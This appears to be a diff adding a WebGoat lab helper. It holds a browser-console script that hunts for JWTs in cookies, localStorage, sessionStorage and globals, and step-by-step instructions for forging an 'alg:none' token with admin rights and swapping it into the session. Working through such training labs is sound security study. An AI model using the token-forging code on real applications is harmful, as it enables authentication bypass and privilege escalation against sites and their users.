@@ -1,0 +1,183 @@
+================================================================================
+  JWT TOKEN LOCATION FINDER
+  Paste this in browser console to find where the JWT is hiding!
+================================================================================
+
+console.log("🔍 Searching for JWT token...\n");
+
+// Check 1: Regular cookies (you said this is empty)
+console.log("1. Regular Cookies:");
+console.log("   document.cookie:", document.cookie);
+if (document.cookie.includes('access_token')) {
+    console.log("   ✓ Found in cookies!");
+} else {
+    console.log("   ❌ Not in cookies (or HttpOnly)");
+}
+
+// Check 2: localStorage
+console.log("\n2. localStorage:");
+try {
+    const localKeys = Object.keys(localStorage);
+    console.log("   Keys:", localKeys);
+    localKeys.forEach(key => {
+        const value = localStorage.getItem(key);
+        if (value && (value.includes('eyJ') || key.toLowerCase().includes('token'))) {
+            console.log(`   ✓ Found: ${key} = ${value.substring(0, 50)}...`);
+        }
+    });
+} catch(e) {
+    console.log("   ❌ Can't access localStorage");
+}
+
+// Check 3: sessionStorage
+console.log("\n3. sessionStorage:");
+try {
+    const sessionKeys = Object.keys(sessionStorage);
+    console.log("   Keys:", sessionKeys);
+    sessionKeys.forEach(key => {
+        const value = sessionStorage.getItem(key);
+        if (value && (value.includes('eyJ') || key.toLowerCase().includes('token'))) {
+            console.log(`   ✓ Found: ${key} = ${value.substring(0, 50)}...`);
+        }
+    });
+} catch(e) {
+    console.log("   ❌ Can't access sessionStorage");
+}
+
+// Check 4: Check Network requests for JWT
+console.log("\n4. Network Requests:");
+console.log("   Open DevTools > Network tab");
+console.log("   Click a user or action on the page");
+console.log("   Look for 'Authorization: Bearer ...' header");
+console.log("   OR look for 'access_token' in request/response");
+
+// Check 5: Global variables
+console.log("\n5. Global Variables:");
+const globals = Object.keys(window).filter(k => k.toLowerCase().includes('token'));
+console.log("   Token-related globals:", globals);
+globals.forEach(g => {
+    try {
+        const value = window[g];
+        if (typeof value === 'string' && value.includes('eyJ')) {
+            console.log(`   ✓ Found: window.${g} = ${value.substring(0, 50)}...`);
+        }
+    } catch(e) {}
+});
+
+console.log("\n" + "=".repeat(70));
+console.log("📋 INSTRUCTIONS:");
+console.log("=".repeat(70));
+console.log("\nIF JWT IS IN LOCALSTORAGE/SESSIONSTORAGE:");
+console.log("   1. Note the key name (e.g., 'access_token')");
+console.log("   2. Get token: localStorage.getItem('KEY_NAME')");
+console.log("   3. Modify and set: localStorage.setItem('KEY_NAME', 'NEW_TOKEN')");
+console.log("\nIF JWT IS HTTPONLY COOKIE:");
+console.log("   1. Go to DevTools > Application > Cookies");
+console.log("   2. Find 'access_token' cookie");
+console.log("   3. Double-click value, delete, paste new token");
+console.log("\nIF JWT IS IN AUTHORIZATION HEADER:");
+console.log("   1. Use browser extension (like ModHeader)");
+console.log("   2. OR intercept requests with DevTools");
+console.log("   3. OR use the PowerShell script");
+
+================================================================================
+  AFTER RUNNING THIS, TRY THESE MANUAL CHECKS
+================================================================================
+
+MANUAL CHECK 1: DevTools Application Tab
+-----------------------------------------
+F12 > Application > Storage:
+- Cookies > http://192.168.254.112:8001
+  - Look for: access_token, jwt, token, auth
+- Local Storage > http://192.168.254.112:8001
+  - Look for any keys with token values
+- Session Storage > http://192.168.254.112:8001
+  - Same as above
+
+MANUAL CHECK 2: DevTools Network Tab
+-------------------------------------
+F12 > Network > Clear > Click something on page
+Look at requests for:
+- Request Headers: Authorization: Bearer eyJ...
+- Request Headers: Cookie: access_token=eyJ...
+- Response Headers: Set-Cookie: access_token=eyJ...
+- Response Body: {"token": "eyJ...", ...}
+
+MANUAL CHECK 3: Right-click Inspect Element
+--------------------------------------------
+Right-click on the page > Inspect
+Look in the HTML for:
+- <input type="hidden" name="token" value="eyJ...">
+- <meta name="jwt" content="eyJ...">
+- <script>var token = "eyJ..."</script>
+
+================================================================================
+  COMMON SCENARIOS
+================================================================================
+
+SCENARIO A: HttpOnly Cookie (most likely for WebGoat)
+------------------------------------------------------
+- document.cookie returns ""
+- But DevTools > Application > Cookies shows access_token
+- Cookie has "HttpOnly" flag checked
+
+SOLUTION:
+1. F12 > Application > Cookies
+2. Find access_token
+3. Double-click the Value column
+4. Delete old token, paste new token
+5. Press Enter
+6. Refresh page or click Reset Votes
+
+SCENARIO B: Token in localStorage
+----------------------------------
+- localStorage.getItem('access_token') returns token
+
+SOLUTION:
+// Create attack token
+const token = localStorage.getItem('access_token');
+const [h,p,s] = token.split('.');
+const pl = JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/')));
+pl.admin = "true";
+const nh = btoa('{"alg":"none"}').replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+const np = btoa(JSON.stringify(pl)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+const at = nh+'.'+np+'.';
+localStorage.setItem('access_token', at);
+console.log("Token updated! Refresh page");
+
+SCENARIO C: Token in Authorization Header Only
+-----------------------------------------------
+- Can't modify in browser
+- Need to intercept requests
+
+SOLUTION: Use PowerShell script Option 12 to send requests with custom token
+
+================================================================================
+  WEBGOAT SPECIFIC: LIKELY SOLUTION
+================================================================================
+
+WebGoat JWT challenges typically use HttpOnly cookies, which means:
+
+1. You CANNOT access via document.cookie in JavaScript
+2. You CAN see and edit in DevTools > Application > Cookies
+3. You MUST manually edit the cookie in DevTools
+
+EXACT STEPS FOR WEBGOAT:
+-------------------------
+1. F12 > Application tab > Cookies > http://192.168.254.112:8001
+2. Find cookie named: access_token
+3. Look at the Value column - that's your JWT
+4. Copy this value
+5. Use PowerShell Option 6 to create attack token
+6. Back in DevTools, double-click the Value of access_token
+7. Delete everything, paste the attack token from PowerShell
+8. Press Enter
+9. Close DevTools (or leave open)
+10. Click "Reset Votes" button on the page
+
+THIS IS WHY YOUR PREVIOUS ATTEMPTS FAILED:
+- You were trying to modify an HttpOnly cookie with JavaScript
+- JavaScript cannot read or write HttpOnly cookies
+- You must modify it manually in DevTools Application tab
+
+================================================================================
